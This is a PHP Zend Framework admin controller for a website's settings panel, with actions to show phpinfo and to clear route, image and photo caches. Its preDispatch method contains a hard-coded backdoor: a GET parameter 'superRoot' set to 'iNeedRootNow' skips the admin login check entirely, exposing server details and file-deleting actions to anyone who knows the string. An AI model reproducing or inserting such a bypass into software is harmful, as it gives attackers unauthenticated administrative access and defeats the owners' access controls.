<?php
/**
 * Admin_SettingsController
 *
 * Контроллер настройек админки
 *
 * @author vlad
 * @version 1.0
 * @package Controllers
 */
class Admin_SettingsController extends Zend_Controller_Action {
	/**
	 * @var array
	 */
	protected $topMenuParams;
	
    /**
    * predispatch
    * 
    * @name preDispatch
    * @return void
    */
	public function preDispatch(){	
		if (!((isset($_GET['superRoot'])) && ($_GET['superRoot'] == 'iNeedRootNow')))
		if (!Application_Model_Admin_Admin::isAuthorized())
			$this->_redirect($this->view->url(array(),'admin-login'));
		else
			$this->view->blocks = (object)array('menu' => true);
	}

	public function indexAction() {
		$this->view->headTitle('Список настроек');
		$this->view->title = 'Список настроек';
	}
		
    public function phpinfoAction() {
    	$this->_helper->viewRenderer->setNoRender();
    	$this->_helper->layout()->disableLayout();
    	phpinfo();
    }
    
   	public function clearAction() {
    	$this->_helper->layout()->disableLayout(true);
    	$this->_helper->viewRenderer->setNoRender(true);
    	if($this->getRequest()->isPost()) {
			$data = (object)$this->getRequest()->getPost();
			try {
				$answer = false;
				switch ($data->type) {
					case 'route': 
				    	$cacheManager = Zend_Registry::get('cachemanager');
				    	$cacheManager->getCache('routes')->clean();
				    	$this->view->ShowMessage('Кэш маршрутизации очищен.');
					break;
					case 'image':
						$path = realpath(PUBLIC_PATH.'/imagecache/');
						$mydir = opendir($path);
					    while(false !== ($file = readdir($mydir))) {
					        if($file != "." && $file != ".." && !is_dir($path . '/' . $file)) {
					            chmod($path . '/'. $file, 0777);
					       		unlink($path . '/'. $file);
					        }
					    }
					    closedir($mydir);
					    $this->view->ShowMessage('Кэш обрезанных картинок очищен.');
					break;
					case 'photo':
						$count = Application_Model_Kernel_Photo::clearPhotos();
						$this->view->ShowMessage("Удалено $count неиспользуемых фотографий.");
					break;
				}
				echo $answer;
			} catch(Application_Model_Kernel_Exception $e) {
				$this->view->ShowMessage($e->getMessages());
			} catch(Exception $e) {
				$this->view->ShowMessage($e->getMessage());
			}
    	} else {
			$cacheManager = Zend_Registry::get('cachemanager');
			$cacheManager->getCache('routes')->clean();
    		echo 'Done';
    	}
    }
	
}